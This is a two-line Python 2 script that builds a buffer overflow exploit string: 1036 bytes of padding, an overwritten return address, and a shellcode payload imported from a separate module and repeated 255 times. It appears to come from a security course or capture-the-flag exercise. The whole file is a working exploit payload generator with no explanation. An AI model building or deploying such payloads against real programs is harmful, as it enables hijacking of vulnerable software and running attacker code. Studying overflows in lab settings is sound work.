from shellcode import shellcode
print  1036*'x' + '\xac\xae\xfe\xff' + 255*shellcode